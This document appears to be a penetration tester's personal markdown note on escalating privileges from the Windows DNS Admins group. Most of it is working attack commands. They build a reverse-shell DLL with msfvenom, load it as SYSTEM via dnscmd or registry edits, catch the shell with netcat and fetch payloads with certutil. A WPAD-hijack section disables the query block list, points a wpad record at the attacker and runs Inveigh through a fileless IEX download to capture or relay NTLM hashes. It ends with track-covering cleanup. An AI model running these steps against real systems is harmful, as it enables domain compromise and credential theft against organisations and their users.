---
Primary_category: "[[WINDOWS PRIVESC]]"
title: DNS ADMINS
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
  - card-list
  - purple-style
---

###### PRIMARY CATEGORY → [[WINDOWS PRIVESC]]&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;[[WINDOWS SECURITY GROUPS|SECURITY GROUPS]]

#### *Theory*

This group is primarily intended for *DNS* management in *AD* enviroments

A domain user account which belongs to this group can manage *DNS* zones, *DNS* records and *DNS* configuration of the given nameserver, which is usually a *DC*

Moreover, it is closely tied to the *DNS Server* role in *AD* as this group is created during the feature installation

---

#### *Enumeration*

##### *Listing the Groups to which the Current User belongs*

```bash
whoami /groups
net user <USER>
```

##### *Members of DNS Admins*

```bash
net localgroup "DNS Admins"
```

---

#### *Code Execution as LOCAL SYSTEM*

We must bear in mind that *Windows DNS* service supports custom plugins and can call functions from them to resolve some name queries

Since this service runs as *LOCAL SYSTEM*, we could use the **`dnscmd`** command line utility to load a malicious plugin *DLL* by specifying a remote path controlled by the attacker

Therefore, an operator could craft a *DLL* which executes a *reverse shell* when the *DNS* service is restarted

That is, we leverage the*ServerLevelPluginDLL* hive to load an arbitrary *DLL*, as stated, once the *DNS* service is restarted, the given *DLL* will be loaded as *LOCAL SYSTEM*

That said, we can proceed as follows →

##### *Generating a Malicious DLL*

> ***From the attacker*** ⚔️

###### *MSFVenom*

```bash
msfvenom --payload windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> --arch x64 --platform windows --format dll --out <MALICIOUS_DLL>.dll
```

> [!DANGER]- *e.g.*
>
> ```bash
> msfvenom --payload windows/x64/shell_reverse_tcp LHOST=10.10.15.63 LPORT=443 --arch x64 --platform windows --format dll --out rev.dll
> ```
>

###### *Mimilib.dll*

> ***[Reference](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)***

> ***[Mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)***

##### *Making the DLL accesible from the target*

> ***See [[#Alternatives|alternatives]]***

###### *Setting up an SMB Server*

> ***From the attacker*** ⚔️

```bash
smbserver.py -smb2support -user '<USER>' -password '<PASSWD>' '<SHARE>' '<LOCAL_PATH>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> smbserver.py -smb2support -user '4l3xbb' -password '4l3xbb' 'smbFolder' "$( pwd )"
> ```
>

##### *Modifying the DNS Service Configuration*

> ***From the target*** 🎯


Then, we need to modify the *ServerLevelPlugindll* key related to the *DNS* service configuration

To do so, we can either use the **`dnscmd`** utility or edit the *registry* directly

###### *DNSCmd.exe*

```bash
dnscmd.exe /config /serverlevelplugindll '\\<ATTACKER_IP>\<MALICIOUS_DLL>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> dnscmd.exe /config /serverlevelplugindll '\\10.10.15.63\rev.dll'
> ```
>

###### *Editing the Windows Registry directly*

> ***CMD & PS → Reg Add***

```bash
reg add 'HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters' /v ServerLevelPluginDll /t REG_SZ /d '\\<ATTACKER_IP>\<MALICIOUS_DLL>' /F
```

> [!DANGER]- *e.g.*
>
> ```bash
> reg add 'HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters' /v ServerLevelPluginDll /t REG_SZ /d 'X:\rev.dll' /F
> ```
>

> ***PS → Set-ItemProperty***

```bash
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters' -Name 'ServerLevelPluginDll' -Value '\\<ATTACKER_IP>\<MALICIOUS_DLL>' -Type String -Force
```

> [!DANGER]- *e.g.*
>
> ```bash
> Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters' -Name 'ServerLevelPluginDll' -Value 'X:\rev.dll' -Type String -Force
> ```
>

##### *Setting up a TCP Listener*

> ***From the attacker*** ⚔️

```bash
rlwrap -CaR nc -nlvp <TCP_PORT>
```

> [!DANGER]- *e.g.*
>
> ```bash
> rlwrap -CaR nc -nlvp 443
> ```
>

##### *Restarting the DNS Service*

> ***From the target*** 🎯

In order to load the *DLL*, it's required to restart the *DNS* service. We may be able to restart the *DNS* service since we are members of the *DNS Admins* group

Regardless of this, we should check which permissions the current user has over the *DNS* service object by retrieving the existing *ACEs* within the *DACL* of its *security descriptor*

###### *Retrieving the Current User SID*

To do so, first we need to know which *SID* the current user has

```bash
cmd.exe /c wmic useraccount where "name='%USERNAME%'" get sid
```

###### *Checking Permission on DNS Service*

> ***[Reference](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)***

Once we know the *SID* of the current user, we can leverage the **`sc.exe sdshow`**  command to retrieve the *securityDescriptor* of the given service object

```bash
sc.exe sdshow DNS
```

###### *Restarting the DNS Service*

With the appropiate permissions, we can restart the service as follows

```bash
sc.exe stop DNS
sc.exe start DNS
```

###### *Alternatives*

If it does not work and we do not receive the ***[[SHELLS AND PAYLOADS#Reverse Shell|reverse shell]]*** , simply transfer the *DLL* to the target and specify the local path of the *DLL* instead of a remote *UNC* path

- ***Transferring the DLL to the target***

> ***From the attacker*** ⚔️

```bash
python -m http.server 80
```

> ***From the target*** 🎯 

```bash
mkdir C:\Windows\Temp\LPE
cd C:\Windows\Temp\LPE
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/<MALICIOUS_DLL>'
```

- ***Modifying the `ServerLevelPluginDll` key to load the malicious DLL***

> ***From the target*** 🎯

```bash
dnscmd.exe /config /serverlevelplugindll 'C:\Windows\Temp\LPE\<MALICIOUS_DLL>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> dnscmd.exe /config /serverlevelplugindll 'C:\Windows\Temp\LPE\rev.dll'
> ```
>

Then return to ***[[#Setting up a TCP Listener]]***

##### *Cleaning up*

Once we receive a shell as *LOCAL SYSTEM* and we can carry out any action as the latter, we should perfom certain cleanup actions to cover our tracks and ensure that the *DNS* service starts correctly i.e. without loading any malicous *DLL* which can affect the service availability

###### *Retrieving the value of ServerLevelPluginDll*

So first, we must validate that the key value was modified correctly

> ***CMD & PS → Reg Query***

```bash
reg query 'HKLM\System\CurrentControlSet\Services\DNS\Parameterps' /v 'ServerLevelPluginDll'
```

> ***PS → Get-ItemProperty***

```bash
(Get-ItemProperty -Path 'HKLM:System\CurrentControlSet\Services\DNS\Parameters').ServerLevelPluginDll
```

###### *Deleting Registry Key*

> ***CMD & PS → Reg Delete***

```bash
reg delete 'HKLM\System\CurrentControlSet\Services\DNS\Parameters' /v 'ServerLevelPluginDll' /f
```

> ***PS → Remove-ItemProperty***

```bash
Remove-ItemProperty -Path 'HKLM:System\CurrentControlSet\Services\DNS\Parameters' -Name 'ServerLevelPluginDll' -Force
```

###### *Restarting the DNS service again*

```bash
sc.exe stop DNS
sc.exe start DNS
```

---

#### *WPAD Abuse*

##### *Workflow*

To prevent ***[[WPAD SPOOFING|WPAD Spoofing]]***, *Microsoft* introduced the ***[[WPAD SPOOFING#Global Query Block List|Global Query Block List]]*** starting with *Window Server 2008*, which causes the *DNS* server to respond with a *NXDOMAIN* indicating that the asked name does not exist, even if it really exists

However, the situation changes when an operator compromises a domain user account which belongs to the *DNS Admins* built-in group

Since any member of this group has the ability to enable, disable or edit the *Global Query Block List*, the entry for *WPAD* can be removed from this list

Immediately afterward, the operator can create a new *DNS* record in the *DNS* zone named *WPAD.domain.internal* pointing to the attacker's *IP Address*

Once this is done, any victim that has the *Automatically detect Proxy settings* option enabled, which is default, will be subject to the following →

- ***A certain web client within its system ( e.g. IE ) will try to automatically detect any valid proxy configuration***

- ***It will send a query name asking for the resolution of `WPAD.domain.internal` to the Primary DNS Server, which is typically the DC on a domain-joined machine***

- ***The DC will respond with the attacker IP Address as the adversary has created the `WPAD.domain.internal` DNS record previously***

- ***Then it will send an HTTP request to the attacker's HTTP server requesting a `wpad.dat` resouce, which is a JS PAC file that contains a proxy configuration***

- ***The HTTP server responds with a `401 Unauthorized` error and a `WWW-Authenticate` HTTP header  asking for some type of authentication to the client***

- ***Lastly, the victim's web client sends an authentication to the attacker and the latter leverage it to capture Net-NTLMv2 hashes or relay the authentication to other node***

##### *Requirements*

That said, in order to be able to carry out this technique, the following requirements must be met

- ***Controlled domain user account belonging to the  DNS ADMINS group***
- ***Attacker machine in the same network as the AD environment***

##### *Abuse - Windows*

###### *Veryfing Group Membership*

```bash
whoami /groups | findstr /I "DNS"
```

###### *Disabling or Deleting the WPAD entry from the Global Query Block List*

-  ***Disable***

> ***CMD & PS → dnscmd.exe***

```bash
dnscmd.exe '<DC_FQDN>' /config /enableglobalqueryblocklist 0
```

> ***PS → Set-DnsServerGlobalQueryBlocklist***

```bash
Set-DnsServerGlobalQueryBlocklist -ComputerName '<DC_FQDN>' -Enable $false
```

- ***WPAD Entry Deletion***

> ***PS → Set-DnsServerGlobalQueryBlocklist***

```bash
Set-DnsServerGlobalQueryBlocklist -ComputerName '<DC_FQDN>' -Name 'wpad' -Remove
```

###### *Checking the status of the Global Query Block List*

> ***PS → Get-DnsServerGlobalQueryBlocklist***

```bash
Get-DnsServerGlobalQueryBlocklist -ComputerName '<DC_FQDN>'
```

###### *Creating the WPAD DNS Record in the Domain DNS Zone*

> ***CMD & PS → dnscmd.exe***

```bash
dnscmd.exe '<DC_FQDN>' /recordadd '<DOMAIN>' wpad A '<ATTACKER_IP>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> dnscmd.exe 'dc01.domain.internal' /recordadd 'domain.internal' wpad A '10.10.15.63'
> ```
> 
>

> ***PS → Add-DnsServerResourceRecordA***

```bash
Add-DnsServerResourceRecordA -ComputerName '<DC_FQDN>' -ZoneName '<DOMAIN>' -Name 'wpad' -IPv4Address '<ATTACKER_IP>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> Add-DnsServerResourceRecordA -ComputerName 'dc01.domain.internal' -ZoneName 'domain.internal' -Name 'wpad' -IPv4Address '10.10.15.63'
> ```
>

###### *Checking the WPAD DNS Record*

> ***CMD & PS → nslookup***

```bash
nslookup wpad.domain.internal <DC_FQDN>
```

> ***PS → Resolve-DNSName***

```bash
Resolve-DNSName -Name wpad.domain.internal -Server <DC_FQDN>
```

###### *Setting up the HTTP Server via a Responder Tool*

> ***[Inveigh](https://github.com/kevin-robertson/inveigh)***

- ***Setup***

***Fileless***

```bash
IEX (New-Object Net.WebClient).downloadString('https://github.com/Kevin-Robertson/Inveigh/raw/refs/heads/master/Inveigh.ps1')
```

***Touching Disk***

```bash
IWR -UseBasicParsing -Uri 'https://github.com/Kevin-Robertson/Inveigh/raw/refs/heads/master/Inveigh.ps1' -OutFile '.\Inveigh.ps1'
```

```bash
Import-Module .\Inveigh.ps1
```

- ***Usage***

```bash
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTP Y -WPAD Y
```

###### *Intercepting Authentications*

Once we receive incoming authentications through *HTTP*, simply proceed as follows →

- ![](https://i.gifer.com/HsWw.gif)
	- [[NTLM RELAY]]
- ![](https://i.gifer.com/HsWw.gif)
	- [[WINDOWS CREDENTIALS CRACKING#NET-NTLMV2 RESPONSE|NET-NTLMV2 CRACKING]]

<br>

##### *Cleanup - Windows*

###### *Deleting the WPAD DNS Record*

> ***CMD & PS → dnscmd.exe***

```bash
dnscmd.exe '<DC_FQDN>' /recorddelete '<DOMAIN>' wpad A '<ATTACKER_IP>' /f
```

> [!DANGER]- *e.g.*
>
> ```bash
> dnscmd.exe 'dc01.domain.internal' /recorddelete 'domain.internal' wpad A '10.10.15.63' /f
> ```
> 
>

> ***PS → Remove-DnsServerResourceRecord***

```bash
Remove-DnsServerResourceRecord -ComputerName '<DC_FQDN>' -ZoneName '<DOMAIN>' -Name 'wpad' -RRType A -Force
```

> [!DANGER]- *e.g.*
>
> ```bash
> Remove-DnsServerResourceRecord -ComputerName 'dc01.domain.internal' -ZoneName 'domain.internal' -Name 'wpad' -RRType A -Force
> ```
>

###### *Reactivating the Global Query Block List*

> ***CMD & PS → dnscmd.exe***

```bash
dnscmd.exe '<DC_FQDN>' /config /enableglobalqueryblocklist 1
```

> ***PS → Set-DnsServerGlobalQueryBlocklist***

```bash
Set-DnsServerGlobalQueryBlocklist -ComputerName '<DC_FQDN>' -Enable $true
```
---

#### *References*

***[ADSecurity: From DNSAdmins to Domain Admin](https://adsecurity.org/?p=4064)***